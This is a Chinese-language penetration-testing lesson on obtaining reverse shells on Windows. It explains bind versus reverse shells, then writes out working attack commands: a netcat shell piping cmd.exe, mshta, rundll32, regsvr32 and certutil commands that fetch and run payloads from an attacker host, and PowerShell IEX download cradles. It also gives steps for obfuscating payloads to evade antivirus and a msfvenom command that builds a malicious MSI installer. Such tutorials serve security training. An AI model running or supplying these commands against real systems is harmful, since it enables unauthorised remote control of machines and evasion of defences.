# 网络安全系统教程：P62：Windows反弹Shell详解 🖥️

在本节课中，我们将要学习Windows系统下的反弹Shell技术。反弹Shell是渗透测试中获取目标主机控制权的一种关键手段。我们将从基础概念讲起，逐步介绍多种实现方法，并通过实例帮助大家理解。

## 反弹Shell简介

上一节我们介绍了课程的整体安排，本节中我们来看看反弹Shell的基本概念。

### 什么是正向Shell

![](img/0d324a8305e2521ad7afa34b559d6c98_1.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_3.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_5.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_6.png)

正向Shell是指控制端主动发起连接请求去连接被控制端。中间的网络链路不存在阻碍。

![](img/0d324a8305e2521ad7afa34b559d6c98_8.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_10.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_11.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_13.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_15.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_17.png)

我们可以这样理解：控制端（攻击机器）主动去请求连接被控端（目标机器）。在正向Shell中，控制端能够直接访问到被控端，两者之间没有拦截请求的设备。

![](img/0d324a8305e2521ad7afa34b559d6c98_20.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_22.png)

### 什么是反弹Shell

![](img/0d324a8305e2521ad7afa34b559d6c98_25.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_27.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_29.png)

反弹Shell，也叫反向Shell，与正向Shell相反。它是指被控端主动发起连接请求去连接控制端。

![](img/0d324a8305e2521ad7afa34b559d6c98_31.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_32.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_34.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_36.png)

通常，由于防火墙、权限或端口占用等问题，被控端无法正常接收从控制端发送的数据包。例如，当控制端在外网，被控端在内网时，外网无法直接访问内网主机。这时就需要使用反弹Shell。

以下是几种常见的Windows反弹Shell方法。

### 1. NC的正向与反向Shell

Netcat (NC) 是一个功能强大的网络工具，可用于端口扫描、文件传输、建立连接等。我们主要用它来建立正向和反向Shell连接。

**正向Shell命令原理：**
被控端监听一个端口，并将本地的CMD Shell环境重定向到该端口。
```bash
# 在被控端执行
nc -lvvp 666 -e cmd.exe
```
控制端主动连接被控端的这个端口，即可获得Shell。
```bash
# 在控制端执行
nc <被控端IP> 666
```

**反向Shell命令原理：**
控制端监听一个端口，等待连接。
```bash
# 在控制端执行
nc -lvvp 666
```
被控端主动连接控制端的监听端口，并将自己的CMD Shell重定向过去。
```bash
# 在被控端执行
nc <控制端IP> 666 -e cmd.exe
```
在实际攻击中，需要先将NC工具上传到目标机器。

![](img/0d324a8305e2521ad7afa34b559d6c98_46.png)

### 2. 利用MSHTA执行HTA应用

MSHTA是Windows自带的用于解释运行HTA应用程序的程序。HTA是使用HTML、CSS、JavaScript等编写的应用程序文件。

![](img/0d324a8305e2521ad7afa34b559d6c98_48.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_50.png)

利用MSHTA可以实现无文件落地执行恶意脚本。Metasploit框架中提供了相关模块（如 `exploit/windows/misc/hta_server`）。攻击者启动一个Web服务托管恶意HTA脚本，诱使目标通过 `mshta.exe http://<攻击者IP>/payload.hta` 命令远程加载执行，从而反弹Shell。

![](img/0d324a8305e2521ad7afa34b559d6c98_52.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_54.png)

### 3. 利用Rundll32执行DLL文件

Rundll32用于调用Windows动态链接库中的函数。我们可以利用它来加载恶意的DLL文件。

在Metasploit中，可以使用 `web_delivery` 模块配合 `windows/meterpreter/reverse_tcp` 载荷。该模块会生成一个类似以下的命令：
```cmd
rundll32.exe url.dll, OpenURL http://<攻击者IP>:8080/xxxx
```
目标执行此命令后，会从攻击者服务器下载并执行恶意DLL，从而建立反向Shell连接。

![](img/0d324a8305e2521ad7afa34b559d6c98_56.png)

### 4. 利用Regsvr32执行脚本

![](img/0d324a8305e2521ad7afa34b559d6c98_58.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_60.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_61.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_62.png)

Regsvr32用于注册COM组件或DLL文件。同样可以用于远程加载脚本。

![](img/0d324a8305e2521ad7afa34b559d6c98_64.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_66.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_68.png)

使用方式与Rundll32类似，Metasploit的 `web_delivery` 模块也支持生成Regsvr32格式的命令：
```cmd
regsvr32 /s /n /u /i:http://<攻击者IP>:8080/payload.sct scrobj.dll
```
执行后，会从指定URL获取并执行脚本，实现反弹Shell。

![](img/0d324a8305e2521ad7afa34b559d6c98_70.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_72.png)

### 5. 利用Certutil下载并执行

![](img/0d324a8305e2521ad7afa34b559d6c98_74.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_76.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_78.png)

Certutil是Windows证书工具，但常被用于下载文件。

![](img/0d324a8305e2521ad7afa34b559d6c98_80.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_81.png)

我们可以通过管道符连接命令，实现下载后立即执行：
```cmd
certutil -urlcache -split -f http://<攻击者IP>/shell.exe shell.exe && shell.exe
```
这条命令会下载恶意exe文件并执行，从而反弹Shell。使用后需注意清除缓存。

### 6. 利用PowerShell

![](img/0d324a8305e2521ad7afa34b559d6c98_90.png)

PowerShell功能强大，是绕过杀软检测的常用手段。以下是几种PowerShell反弹Shell的方式。

![](img/0d324a8305e2521ad7afa34b559d6c98_92.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_94.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_96.png)

*   **PowerCat：** 一个PowerShell版本的Netcat。可以远程加载脚本并建立连接。
    ```powershell
    # 远程加载PowerCat并建立反向Shell
    IEX (New-Object System.Net.Webclient).DownloadString(‘http://<攻击者IP>/powercat.ps1’); powercat -c <控制端IP> -p 4444 -e cmd
    ```
*   **Metasploit的 `web_delivery` 模块：** 选择 `Powershell` 作为目标，模块会生成一条PowerShell命令，在目标上执行即可获得Shell。
*   **远程加载并执行VBS/WSF脚本：** 通过PowerShell下载VBS等脚本文件，然后调用 `cscript.exe` 执行。
    ```powershell
    # 示例：下载并执行VBS脚本
    IEX (New-Object Net.WebClient).DownloadString(‘http://<攻击者IP>/payload.vbs’); Start-Process cscript.exe -ArgumentList “payload.vbs”
    ```

![](img/0d324a8305e2521ad7afa34b559d6c98_98.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_100.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_101.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_102.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_103.png)

**PowerShell混淆与免杀：**
直接使用生成的PowerShell脚本容易被杀软检测。可以使用混淆工具（如 `Invoke-Obfuscation`）对代码进行混淆，以绕过静态检测。
1.  在PowerShell中导入混淆模块：`Import-Module ./Invoke-Obfuscation.psd1`
2.  启动工具：`Invoke-Obfuscation`
3.  设置要混淆的脚本路径：`SET SCRIPTPATH /path/to/payload.ps1`
4.  选择混淆方法（如 `TOKEN` 下的 `ALL`）
5.  输出混淆后的脚本：`OUT ./obfuscated.ps1`
混淆后的脚本再通过 `powershell -File obfuscated.ps1` 或远程加载方式执行，可提高免杀率。

### 7. 利用MSIEXEC执行安装包

![](img/0d324a8305e2521ad7afa34b559d6c98_114.png)

![](img/0d324a8305e2521ad7afa34b559d6c98_116.png)

MSIEXEC是Windows安装引擎，用于执行 `.msi` 安装包。我们可以生成恶意的MSI安装包文件。

![](img/0d324a8305e2521ad7afa34b559d6c98_118.png)

当目标用户运行此MSI文件时，系统会调用 `msiexec.exe` 执行其中的操作，从而触发我们的反弹Shell载荷。Metasploit的 `msfvenom` 可以生成此类文件。
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<攻击者IP> LPORT=4444 -f msi -o shell.msi
```
